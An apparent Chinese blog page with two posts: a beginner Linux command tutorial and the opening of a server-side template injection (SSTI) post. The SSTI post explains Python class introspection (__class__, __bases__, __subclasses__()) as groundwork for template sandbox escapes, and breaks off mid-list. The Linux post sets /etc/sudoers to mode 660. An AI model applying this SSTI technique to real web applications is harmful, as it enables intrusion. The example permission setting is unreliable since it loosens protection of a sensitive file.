<h1 id="Linux常用命令2"><a href="#Linux常用命令2" class="headerlink" title="Linux常用命令2"></a>Linux常用命令2</h1><h3 id="文件打包压缩命令tar"><a href="#文件打包压缩命令tar" class="headerlink" title="文件打包压缩命令tar"></a>文件打包压缩命令tar</h3><p>tar命令可用于压缩解压文件，好比windows的winRAR</p>
<p>语法格式：</p>
<p>tar[选项]文件或者目录</p>
<p>tar选项</p>
<table>
<thead>
<tr>
<th>选项</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>-c</td>
<td>创建新的打包文件</td>
</tr>
<tr>
<td>-v</td>
<td>显示打包或者解包的文件的详情</td>
</tr>
<tr>
<td>-f</td>
<td>使用打包文件或者设备,这个选项是必选项，一般放到所有选项后面</td>
</tr>
<tr>
<td>-z</td>
<td>用gzip格式来压缩或解压缩文件(.gz)</td>
</tr>
<tr>
<td>-j</td>
<td>用bzip2格式来压缩或解压缩文件(.bz2)</td>
</tr>
<tr>
<td>-x</td>
<td>解包</td>
</tr>
<tr>
<td>-C</td>
<td>解压到指定目录</td>
</tr>
</tbody></table>
<p>gz格式压缩和解压:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tar -zcvf 压缩后的名字 .tar.gz 要压缩的文件和目录</span><br><span class="line">tar -zxvf 压缩包的名字 .tar.gz -C 要解压到的目录</span><br></pre></td></tr></table></figure>

<p>.bz2的压缩和解压缩格式:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tar -jcvf 压缩后的名字 .tar.bz2 要压缩的文件</span><br><span class="line">tar -jxvf 压缩包的名字.tar.bz2 -C 要解压到的目录(目录需要存在)</span><br></pre></td></tr></table></figure>

<h3 id="用户管理"><a href="#用户管理" class="headerlink" title="用户管理"></a>用户管理</h3><h4 id="用户分类"><a href="#用户分类" class="headerlink" title="用户分类"></a>用户分类</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">超级用户(管理员)</span><br><span class="line">	该用户具有所有管理权限，UID=<span class="number">0</span></span><br><span class="line">系统用户</span><br><span class="line">针对特定的系统服务而开设的用户，系统用户不能用于登录，UID范围<span class="number">1</span>-<span class="number">999</span></span><br><span class="line">普通用户</span><br><span class="line">为了让使用者使用Linux系统资源而建立的户，UID范围<span class="number">1000</span>--<span class="number">65535</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">查看用户<span class="built_in">id</span>命令:<span class="built_in">id</span>[用户名]</span><br><span class="line">选项： -u(查看用户uid) -g(查看用户gid) -G(查看用户所在所有组的<span class="built_in">id</span>)</span><br></pre></td></tr></table></figure>

<h4 id="用户、组相关的配置文件"><a href="#用户、组相关的配置文件" class="headerlink" title="用户、组相关的配置文件"></a>用户、组相关的配置文件</h4><p>配置文件</p>
<table>
<thead>
<tr>
<th>文件名</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>&#x2F;etc&#x2F;passwd&#x2F;</td>
<td>用户信息库</td>
</tr>
<tr>
<td>&#x2F;etc&#x2F;group</td>
<td>用户组信息库</td>
</tr>
<tr>
<td>&#x2F;etc&#x2F;shadow</td>
<td>用户认证信息</td>
</tr>
<tr>
<td>&#x2F;etc&#x2F;gshadow</td>
<td>用户组认证信息</td>
</tr>
</tbody></table>
<h4 id="用户管理-1"><a href="#用户管理-1" class="headerlink" title="用户管理"></a>用户管理</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">添加用户</span><br><span class="line">useradd [选项 参数] 用户名</span><br><span class="line">选项：</span><br><span class="line">-d ： 指定用户主目录默认的主目录</span><br><span class="line">/home/kali</span><br><span class="line">-M ：不创建用户主目录</span><br><span class="line">useradd CTF</span><br><span class="line">-s ： 指定新用户登录后使用的shell，默认是/<span class="built_in">bin</span>/bash</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">设置用户密码</span><br><span class="line">passwd 用户名</span><br><span class="line">修改用户属性</span><br><span class="line">usermod [选项 参数] 用户名</span><br><span class="line">删除用户</span><br><span class="line">userdel 用户名</span><br><span class="line">选项</span><br><span class="line">-r:同时删除用户主目录</span><br></pre></td></tr></table></figure>

<h3 id="sudo命令-super-user-do"><a href="#sudo命令-super-user-do" class="headerlink" title="sudo命令 super user do"></a>sudo命令 super user do</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo 以超级用户身份执行某条文件命令</span><br><span class="line">格式：sudo 当前用户要执行某条命令</span><br></pre></td></tr></table></figure>

<h3 id="chmod命令"><a href="#chmod命令" class="headerlink" title="chmod命令"></a>chmod命令</h3><p>用于修改文件权限</p>
<h4 id="文件列表中权限查看"><a href="#文件列表中权限查看" class="headerlink" title="文件列表中权限查看"></a>文件列表中权限查看</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">-rw-rw-r-- 1 rh rh 6 7月 1908:43 b.txt</span><br><span class="line">文件的权限分为3组，</span><br><span class="line">每一组由三个字母组成（rwx-）</span><br><span class="line">1.rw-</span><br><span class="line">文件属主用户对文件的权限</span><br><span class="line">2.rw-</span><br><span class="line">文件属主用户的同组用户具有的权限</span><br><span class="line">3.r--</span><br><span class="line">其他用户具有的权限</span><br></pre></td></tr></table></figure>

<p><img src="/2023/03/22/Linux%E5%9F%BA%E7%A1%80/image-20230322204030351.png" alt="image-20230322204030351"></p>
<h4 id="字母法"><a href="#字母法" class="headerlink" title="字母法"></a>字母法</h4><p>命令格式：chmod MODE[,MODE]…FILE…</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">chmod u+r a.txt</span><br><span class="line">针对a.txt文件，属主用户增加读权限</span><br><span class="line">chmod u=rW,g=r,o=- b.txt</span><br><span class="line">针对b.txt文件，属主用户设置读和写权限，同组的用户设置读和写的权限,其他用户增加读权限</span><br></pre></td></tr></table></figure>

<p>角色说明</p>
<table>
<thead>
<tr>
<th>角色</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>u</td>
<td>user,表示该文件的所有者</td>
</tr>
<tr>
<td>g</td>
<td>group,表示用户组</td>
</tr>
<tr>
<td>o</td>
<td>other,表示其他用户</td>
</tr>
<tr>
<td>a</td>
<td>all,表示所有用户</td>
</tr>
</tbody></table>
<p>权限设置说明</p>
<table>
<thead>
<tr>
<th>操作符</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>+</td>
<td>增加权限</td>
</tr>
<tr>
<td>-</td>
<td>撤销权限</td>
</tr>
<tr>
<td>&#x3D;</td>
<td>设置权限</td>
</tr>
</tbody></table>
<p>权限说明</p>
<table>
<thead>
<tr>
<th>权限</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>r</td>
<td>可读</td>
</tr>
<tr>
<td>w</td>
<td>可写</td>
</tr>
<tr>
<td>x</td>
<td>可执行，假如是目录，表示可打开目录</td>
</tr>
<tr>
<td>-</td>
<td>无任何权限</td>
</tr>
</tbody></table>
<h4 id="数字化"><a href="#数字化" class="headerlink" title="数字化"></a>数字化</h4><p>就是rwx用数字代替</p>
<p><img src="/2023/03/22/Linux%E5%9F%BA%E7%A1%80/image-20230322211901985.png" alt="image-20230322211901985"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">使用数字法对/etc/sudoers文件的属主用户设置读写权限，同组用户为读写权限，其他用户为无权限</span><br><span class="line">rw-rw----</span><br><span class="line">chmod <span class="number">660</span> /etc/sudoers</span><br></pre></td></tr></table></figure>

<h1 id="Vim编辑器"><a href="#Vim编辑器" class="headerlink" title="Vim编辑器"></a>Vim编辑器</h1><h4 id="认识Vim"><a href="#认识Vim" class="headerlink" title="认识Vim"></a>认识Vim</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">VI是Unix家族中极为普遍的文本编辑器，Vim则是它的改进版本Vi IMproved的简称，它的最大特色就是使用命令进行编辑，且完全脱离了鼠标的操作</span><br></pre></td></tr></table></figure>

<h4 id="Vim的三种工作模式"><a href="#Vim的三种工作模式" class="headerlink" title="Vim的三种工作模式"></a>Vim的三种工作模式</h4><p>命令模式</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">启动Vim，默认进入命令模式。在该模式下，此时从键盘上输入的任何字符都被当做编辑命令来解释</span><br><span class="line">常用于对文档进行复制、粘贴、删除、移动光标等操作。</span><br></pre></td></tr></table></figure>



<p>编辑模式</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">在命令模式下输入插入命令i、附加命令a、打开命令o都可以进入编辑模式，一次Insert键:插入字符、两次Insert键:替换字符(REPLACE)在该模式下，主要用于录入文本。</span><br><span class="line">按ESC键回退到命令模式</span><br></pre></td></tr></table></figure>

<p>末行模式</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">在命令模式按shift+；即按:进入末行模式，多数文件管理命令(保存、退出、定位、查找、替换、设置行标等)都是在此模式下执行的</span><br><span class="line"></span><br><span class="line">回车执行完命令或按ESC键回退到命令模式</span><br></pre></td></tr></table></figure>

<p><img src="/2023/03/22/Linux%E5%9F%BA%E7%A1%80/image-20230322212409215.png" alt="image-20230322212409215"></p>
<h4 id="使用Vim编辑文件，文档配置"><a href="#使用Vim编辑文件，文档配置" class="headerlink" title="使用Vim编辑文件，文档配置"></a>使用Vim编辑文件，文档配置</h4><p>示例:使用Vim修改主机名</p>
<p>主机名配置文件：&#x2F;etc&#x2F;hostname</p>
<p>切换到root账号:suroot</p>
<p>使用Vim打开配置文件：vim&#x2F;etc&#x2F;hostname</p>
<p>按i进入编辑模式</p>
<p>修改为新的主机名(不要输入中文)</p>
<p>按ESC键由编辑模式进入命令模式</p>
<p>按shift+;由命令模式进入末行模式</p>
<p>输入wq保存退出Vim</p>
<p>注销用户或者重启系统后查看效果</p>
<h4 id="Vim常用的命令"><a href="#Vim常用的命令" class="headerlink" title="Vim常用的命令"></a>Vim常用的命令</h4><h5 id="命令模式下的Vim操作"><a href="#命令模式下的Vim操作" class="headerlink" title="命令模式下的Vim操作"></a>命令模式下的Vim操作</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">准备操作素材vim temp.txt</span><br><span class="line">从命令模式按i或者a进入编辑模式</span><br><span class="line">录入如下图所示文本</span><br><span class="line">在编辑模式按esc回退到命令模式，再按shift+;进入末行模式</span><br><span class="line">在末行模式中输入wq保存退出</span><br><span class="line">素材准备完毕</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>移动光标操作</span><br><span class="line">方向箭头(上下左右)</span><br><span class="line">^移至行首,$移至行尾</span><br><span class="line">G和gg(G移到文档最后一行，gg移到文档首行)</span><br><span class="line"><span class="number">2.</span>删除命令操作</span><br><span class="line">x删除光标所在字符</span><br><span class="line">dd剪切删除光标所在的一行</span><br><span class="line"><span class="number">3.</span>复制与粘贴命令</span><br><span class="line">yy与nyy：yy复制当前光标所在行，n yy复制光标行及光标下n-<span class="number">1</span>行</span><br><span class="line">p与np：p粘贴一次,n p粘贴n次</span><br></pre></td></tr></table></figure>

<h5 id="末行模式下的vim操作"><a href="#末行模式下的vim操作" class="headerlink" title="末行模式下的vim操作"></a>末行模式下的vim操作</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>文件保存退出</span><br><span class="line">w保存文档</span><br><span class="line">q退出文档</span><br><span class="line">wq保存且退出文档</span><br><span class="line">q!不保存退出文档</span><br><span class="line"><span class="number">2.</span>显示或隐藏行号</span><br><span class="line">setnu显示行号</span><br><span class="line">setnonu隐藏行号</span><br></pre></td></tr></table></figure>

 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Linux/" rel="tag">Linux</a></li></ul>

    </footer>
  </div>

   
   
  
</article>

    
    <article
  id="post-SSTI"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2023/03/16/SSTI/"
    >SSTI</a> 
</h2>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2023/03/16/SSTI/" class="article-date">
  <time datetime="2023-03-16T12:24:04.000Z" itemprop="datePublished">2023-03-16</time>
</a> 
  <div class="article-category">
    <a class="article-category-link" href="/categories/Web/">Web</a> / <a class="article-category-link" href="/categories/Web/SSTI/">SSTI</a>
  </div>
   
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <h2 id="SSTI漏洞产生原因"><a href="#SSTI漏洞产生原因" class="headerlink" title="SSTI漏洞产生原因"></a>SSTI漏洞产生原因</h2><p>render_template函数自动渲染对应的内容，不会在执行渲染，但是你用render_template_string就可能出现再次渲染的问题</p>
<p>导致里面的x会当作代码执行</p>
<h2 id="python类基础"><a href="#python类基础" class="headerlink" title="python类基础"></a>python类基础</h2><h3 id="class"><a href="#class" class="headerlink" title="class"></a><strong>class</strong></h3><p>在python中object类是python中所有类的基类，如果定义一个类时没有指定继承哪个类，则默认继承object类，每个类都有魔术变量__class__,表示当前类</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.__class__)</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;str&#x27;</span>&gt;</span><br><span class="line"><span class="built_in">print</span>([].__class__)</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;list&#x27;</span>&gt;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<h3 id="bases"><a href="#bases" class="headerlink" title="bases"></a><strong>bases</strong></h3><p>每一个类都有一个__bases__属性，列出其基类</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">变量.__class__.__bases__ <span class="comment">#列出所有的基类，返回的是元组类型</span></span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__bases__</span><br><span class="line">(&lt;<span class="keyword">class</span> <span class="string">&#x27;object&#x27;</span>&gt;,)</span><br><span class="line"></span><br><span class="line">变量.__class__.__bases__[<span class="number">0</span>]  <span class="comment">#可以使用数组方法返回第一个基类</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__     <span class="comment">#它会显示类和基类，这是它和__bases__的不同,同样也可以使用数组方法</span></span><br><span class="line">(&lt;<span class="keyword">class</span> <span class="string">&#x27;str&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;object&#x27;</span>&gt;)</span><br></pre></td></tr></table></figure>

<h3 id="subclasses"><a href="#subclasses" class="headerlink" title="subclasses()"></a><strong>subclasses</strong>()</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">__subclasses__()查看当前类的子类，格式变量.__class__.__bases__[<span class="number">0</span>].__subclasses__()  <span class="comment">#返回的是列表类型</span></span><br><span class="line">这个类也可以加数组来查看指定的索引值，例如变量.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">0</span>]</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;type&#x27;</span>&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&lt;<span class="keyword">class</span> <span class="string">&#x27;type&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;async_generator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;int&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;bytearray_iterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;bytearray&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;bytes_iterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;bytes&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;builtin_function_or_method&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;callable_iterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;PyCapsule&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;cell&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;classmethod_descriptor&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;classmethod&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;code&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;complex&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;coroutine&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;dict_items&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;dict_itemiterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;dict_keyiterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;dict_valueiterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;dict_keys&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;mappingproxy&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;dict_reverseitemiterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;dict_reversekeyiterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;dict_reversevalueiterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;dict_values&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;dict&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;ellipsis&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;enumerate&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;float&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;frame&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;frozenset&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;function&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;generator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;getset_descriptor&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;instancemethod&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;list_iterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;list_reverseiterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;list&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;longrange_iterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;member_descriptor&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;memoryview&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;method_descriptor&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;method&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;moduledef&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;module&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;odict_iterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;pickle.PickleBuffer&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;property&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;range_iterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;range&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;reversed&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;symtable entry&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;iterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;set_iterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;set&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;slice&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;staticmethod&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;stderrprinter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;super&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;traceback&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;tuple_iterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;tuple&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;str_iterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;str&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;wrapper_descriptor&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;types.GenericAlias&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;anext_awaitable&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;async_generator_asend&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;async_generator_athrow&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;async_generator_wrapped_value&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;coroutine_wrapper&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;InterpreterID&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;managedbuffer&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;method-wrapper&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;types.SimpleNamespace&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;NoneType&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;NotImplementedType&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;weakcallableproxy&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;weakproxy&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;weakref&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;types.UnionType&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;EncodingMap&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;fieldnameiterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;formatteriterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;BaseException&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;hamt&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;hamt_array_node&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;hamt_bitmap_node&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;hamt_collision_node&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;keys&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;values&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;items&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_contextvars.Context&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_contextvars.ContextVar&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_contextvars.Token&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;Token.MISSING&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;filter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;map&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;zip&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_frozen_importlib._ModuleLock&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_frozen_importlib._DummyModuleLock&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_frozen_importlib._ModuleLockManager&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_frozen_importlib.ModuleSpec&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_frozen_importlib.BuiltinImporter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_frozen_importlib.FrozenImporter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_frozen_importlib._ImportLockContext&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_thread.lock&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_thread.RLock&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_thread._localdummy&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_thread._local&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_io._IOBase&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_io._BytesIOBuffer&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_io.IncrementalNewlineDecoder&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;nt.ScandirIterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;nt.DirEntry&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;PyHKEY&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_frozen_importlib_external.WindowsRegistryFinder&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_frozen_importlib_external._LoaderBasics&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_frozen_importlib_external.FileLoader&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_frozen_importlib_external._NamespacePath&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_frozen_importlib_external._NamespaceLoader&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_frozen_importlib_external.PathFinder&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_frozen_importlib_external.FileFinder&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;codecs.Codec&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;codecs.IncrementalEncoder&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;codecs.IncrementalDecoder&#x27;</span>&gt;, &lt;<span 